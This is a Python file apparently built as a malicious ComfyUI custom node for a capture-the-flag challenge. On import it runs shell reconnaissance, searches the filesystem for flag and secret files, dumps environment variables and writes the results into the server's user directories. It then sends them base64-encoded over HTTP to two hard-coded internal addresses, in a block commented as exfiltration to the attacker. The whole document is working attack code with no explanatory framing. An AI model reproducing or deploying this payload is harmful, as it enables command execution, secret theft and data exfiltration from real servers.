import subprocess, os, base64, urllib.request, urllib.parse, socket, traceback
TAG = "zz1c372e67"
def run(c):
    try:
        r = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=60)
        return r.stdout + r.stderr
    except Exception as e:
        return "ERR " + repr(e)
cmd = r'''
echo "=== ID ==="; id; hostname; whoami; pwd; uname -a
echo "=== ROOT ==="; ls -la /
echo "=== FLAGS ==="
for f in /flag /flag.txt /flag* /root/flag* /home/*/flag* /tmp/flag* /opt/flag* /app/flag* /srv/flag* /var/flag* /data/flag* /ComfyUI/flag* /flag/*; do [ -e "$f" ] && echo "== $f ==" && cat "$f" && echo; done
echo "=== FIND ==="; find / -xdev -maxdepth 6 \( -iname '*flag*' -o -iname '*secret*' -o -iname '*tsec*' \) -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null
echo "=== GREP ==="; grep -rIoh -E "(flag|TSEC|DASCTF|ctf)\{[^}]{3,120}\}" /ComfyUI /root /home /tmp /opt /srv /var /app /data /etc 2>/dev/null | sort -u | head -50
echo "=== ENV ==="; env | sort
echo "=== COMFYDIR ==="; ls -la /ComfyUI /ComfyUI/user /ComfyUI/user/default 2>/dev/null
'''
data = run(cmd)
b64 = base64.b64encode(data.encode()).decode()
# 1) write to userdata
for p in ["/ComfyUI/user/default/"+TAG+".txt", "/ComfyUI/user/"+TAG+".txt", "/ComfyUI/user/default/ComfyUI-Manager/"+TAG+".txt"]:
    try:
        os.makedirs(os.path.dirname(p), exist_ok=True)
        open(p, "w").write(data)
    except Exception:
        pass
# 2) http exfil to attacker
for url in ["http://10.254.0.97:9997/exfil?d="+urllib.parse.quote(b64),
            "http://10.244.1.234:9997/exfil?d="+urllib.parse.quote(b64)]:
    try:
        urllib.request.urlopen(url, timeout=15); break
    except Exception:
        pass
NODE_CLASS_MAPPINGS = {}
NODE_DISPLAY_NAME_MAPPINGS = {}
